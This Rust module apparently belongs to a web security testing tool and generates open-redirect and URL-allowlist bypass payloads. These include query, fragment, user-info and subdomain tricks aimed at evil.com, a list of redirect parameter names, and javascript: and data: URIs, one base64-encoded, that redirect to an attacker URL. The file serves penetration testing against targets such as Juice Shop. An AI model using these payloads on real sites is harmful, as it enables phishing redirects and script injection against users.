//! Redirect and Allowlist Bypass Payloads
//!
//! Payloads for bypassing URL allowlists and redirect validation.
//! Based on techniques observed in Juice Shop and real-world applications.

/// Redirect bypass payload
#[derive(Debug, Clone)]
pub struct RedirectPayload {
    pub name: String,
    pub url: String,
    pub technique: RedirectTechnique,
}

/// Categories of redirect bypass techniques
#[derive(Debug, Clone, PartialEq)]
pub enum RedirectTechnique {
    /// Query parameter injection: evil.com?param=allowed.com
    QueryInjection,
    /// Fragment injection: evil.com#allowed.com
    FragmentInjection,
    /// Credential injection: allowed.com@evil.com
    CredentialInjection,
    /// Protocol-relative: //evil.com
    ProtocolRelative,
    /// Path confusion: /allowed.com/../evil.com
    PathConfusion,
    /// Unicode/encoding bypass
    EncodingBypass,
    /// Case manipulation
    CaseManipulation,
    /// Subdomain bypass
    SubdomainBypass,
}

impl RedirectPayload {
    pub fn new(name: &str, url: &str, technique: RedirectTechnique) -> Self {
        Self {
            name: name.to_string(),
            url: url.to_string(),
            technique,
        }
    }
}

/// Bypass allowlist check using query parameter injection
///
/// Many allowlist implementations use simple string matching like:
/// `url.includes("allowed.com")` which can be bypassed by appending
/// the allowed URL as a query parameter.
///
/// # Example
/// ```
/// use rectitude::payloads::redirect::allowlist_bypass;
/// let bypass = allowlist_bypass("https://evil.com", "github.com/juice-shop");
/// assert!(bypass.contains("github.com"));
/// ```
pub fn allowlist_bypass(target_url: &str, allowed_url: &str) -> String {
    format!("{}?pwned={}", target_url, allowed_url)
}

/// Generate comprehensive redirect bypass payloads
///
/// Given a target URL and an allowed URL pattern, generates
/// various bypass techniques to test allowlist implementations.
pub fn redirect_bypass_payloads(target: &str, allowed: &str) -> Vec<RedirectPayload> {
    let target = target.trim_end_matches('/');
    let allowed = allowed
        .trim_start_matches("https://")
        .trim_start_matches("http://");

    vec![
        // Query parameter injection
        RedirectPayload::new(
            "Query param injection",
            &format!("{}?url={}", target, allowed),
            RedirectTechnique::QueryInjection,
        ),
        RedirectPayload::new(
            "Query param pwned",
            &format!("{}?pwned={}", target, allowed),
            RedirectTechnique::QueryInjection,
        ),
        RedirectPayload::new(
            "Query param redirect",
            &format!("{}?redirect={}", target, allowed),
            RedirectTechnique::QueryInjection,
        ),
        // Fragment injection
        RedirectPayload::new(
            "Fragment injection",
            &format!("{}#{}", target, allowed),
            RedirectTechnique::FragmentInjection,
        ),
        // Credential injection (user:pass@host)
        RedirectPayload::new(
            "Credential injection",
            &format!(
                "https://{}@{}",
                allowed,
                target
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
            ),
            RedirectTechnique::CredentialInjection,
        ),
        // Protocol-relative
        RedirectPayload::new(
            "Protocol-relative",
            &format!(
                "//{}",
                target
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
            ),
            RedirectTechnique::ProtocolRelative,
        ),
        // Path confusion
        RedirectPayload::new(
            "Path confusion with dots",
            &format!(
                "/{}/../../{}",
                allowed,
                target
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
            ),
            RedirectTechnique::PathConfusion,
        ),
        RedirectPayload::new(
            "Trailing slash confusion",
            &format!("{}/{}/", target, allowed),
            RedirectTechnique::PathConfusion,
        ),
        // Encoding bypass
        RedirectPayload::new(
            "URL encoded",
            &format!("{}%3F{}", target, allowed),
            RedirectTechnique::EncodingBypass,
        ),
        RedirectPayload::new(
            "Double encoded",
            &format!("{}%253F{}", target, allowed),
            RedirectTechnique::EncodingBypass,
        ),
        // Case manipulation
        RedirectPayload::new(
            "Case variation",
            &format!("{}?URL={}", target.to_uppercase(), allowed),
            RedirectTechnique::CaseManipulation,
        ),
    ]
}

/// Generate URL-based bypass payloads for open redirect testing
///
/// Tests common patterns that can lead to open redirects.
pub fn open_redirect_payloads(target_domain: &str) -> Vec<RedirectPayload> {
    let evil = "evil.com";

    vec![
        // Basic redirects
        RedirectPayload::new(
            "Double slash prefix",
            &format!("//{}", evil),
            RedirectTechnique::ProtocolRelative,
        ),
        RedirectPayload::new(
            "Backslash bypass",
            &format!("\\\\{}", evil),
            RedirectTechnique::EncodingBypass,
        ),
        RedirectPayload::new(
            "Tab bypass",
            &format!("//\t{}", evil),
            RedirectTechnique::EncodingBypass,
        ),
        RedirectPayload::new(
            "Newline bypass",
            &format!("//\n{}", evil),
            RedirectTechnique::EncodingBypass,
        ),
        // Subdomain confusion
        RedirectPayload::new(
            "Subdomain bypass",
            &format!("https://{}.{}", target_domain, evil),
            RedirectTechnique::SubdomainBypass,
        ),
        RedirectPayload::new(
            "Fake subdomain",
            &format!("https://{}.{}", evil, target_domain),
            RedirectTechnique::SubdomainBypass,
        ),
        // Credential confusion
        RedirectPayload::new(
            "User:pass prefix",
            &format!("https://{}:password@{}", target_domain, evil),
            RedirectTechnique::CredentialInjection,
        ),
        RedirectPayload::new(
            "At-sign confusion",
            &format!("https://{}@{}", target_domain, evil),
            RedirectTechnique::CredentialInjection,
        ),
        // Encoding tricks
        RedirectPayload::new(
            "Unicode dot",
            &format!("https://{}。{}", evil, target_domain),
            RedirectTechnique::EncodingBypass,
        ),
        RedirectPayload::new(
            "Homograph attack",
            &format!("https://xn--{}.com", target_domain.replace('a', "xn--")),
            RedirectTechnique::EncodingBypass,
        ),
    ]
}

/// Common redirect parameters to test
pub fn redirect_parameters() -> Vec<&'static str> {
    vec![
        "url",
        "redirect",
        "redirect_url",
        "redirect_uri",
        "next",
        "next_url",
        "return",
        "return_url",
        "returnTo",
        "return_to",
        "goto",
        "go",
        "target",
        "to",
        "dest",
        "destination",
        "continue",
        "callback",
        "callback_url",
        "forward",
        "forward_url",
        "out",
        "view",
        "ref",
        "rurl",
    ]
}

/// Test if a URL uses a weak allowlist check
///
/// Returns payloads that would bypass common weak checks:
/// - `url.includes()` / `url.contains()`
/// - Simple substring matching
/// - Regex without anchors
pub fn weak_allowlist_bypasses(allowed_domain: &str, evil_domain: &str) -> Vec<String> {
    vec![
        // includes() bypass via query string
        format!("https://{}?x={}", evil_domain, allowed_domain),
        // includes() bypass via fragment
        format!("https://{}#{}", evil_domain, allowed_domain),
        // includes() bypass via path
        format!("https://{}/{}", evil_domain, allowed_domain),
        // includes() bypass via subdomain (if check is for partial match)
        format!("https://{}.{}", allowed_domain, evil_domain),
        // includes() bypass via user info
        format!("https://{}@{}", allowed_domain, evil_domain),
        // Data URI with domain reference
        format!(
            "data:text/html,<script>location='{}'</script>{}",
            evil_domain, allowed_domain
        ),
    ]
}

/// JavaScript-based redirect payloads
///
/// For cases where the redirect is handled client-side.
pub fn javascript_redirect_payloads(evil_url: &str) -> Vec<String> {
    vec![
        format!("javascript:location='{}'", evil_url),
        format!("javascript:location.href='{}'", evil_url),
        format!("javascript:window.location='{}'", evil_url),
        format!("javascript:document.location='{}'", evil_url),
        format!("javascript:top.location='{}'", evil_url),
        format!("javascript:parent.location='{}'", evil_url),
        format!("data:text/html,<script>location='{}'</script>", evil_url),
        format!("data:text/html;base64,{}", base64_redirect(evil_url)),
    ]
}

/// Generate base64-encoded HTML redirect
fn base64_redirect(url: &str) -> String {
    use base64::{Engine as _, engine::general_purpose::STANDARD};
    let html = format!("<script>location='{}'</script>", url);
    STANDARD.encode(html.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowlist_bypass() {
        let bypass = allowlist_bypass("https://evil.com", "github.com/juice-shop");
        assert!(bypass.contains("evil.com"));
        assert!(bypass.contains("github.com"));
        assert!(bypass.contains("?pwned="));
    }

    #[test]
    fn test_redirect_bypass_payloads() {
        let payloads = redirect_bypass_payloads("https://evil.com", "allowed.com");
        assert!(!payloads.is_empty());

        // Check various techniques are represented
        assert!(
            payloads
                .iter()
                .any(|p| p.technique == RedirectTechnique::QueryInjection)
        );
        assert!(
            payloads
                .iter()
                .any(|p| p.technique == RedirectTechnique::FragmentInjection)
        );
        assert!(
            payloads
                .iter()
                .any(|p| p.technique == RedirectTechnique::CredentialInjection)
        );
    }

    #[test]
    fn test_open_redirect_payloads() {
        let payloads = open_redirect_payloads("example.com");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.url.contains("//")));
    }

    #[test]
    fn test_redirect_parameters() {
        let params = redirect_parameters();
        assert!(params.contains(&"redirect"));
        assert!(params.contains(&"next"));
        assert!(params.contains(&"return_url"));
    }

    #[test]
    fn test_weak_allowlist_bypasses() {
        let bypasses = weak_allowlist_bypasses("trusted.com", "evil.com");
        assert!(!bypasses.is_empty());
        // All bypasses should contain the allowed domain (to pass includes check)
        for bypass in &bypasses {
            assert!(bypass.contains("trusted.com"));
        }
    }

    #[test]
    fn test_javascript_redirect_payloads() {
        let payloads = javascript_redirect_payloads("https://evil.com");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("javascript:")));
        assert!(payloads.iter().any(|p| p.starts_with("data:")));
    }
}
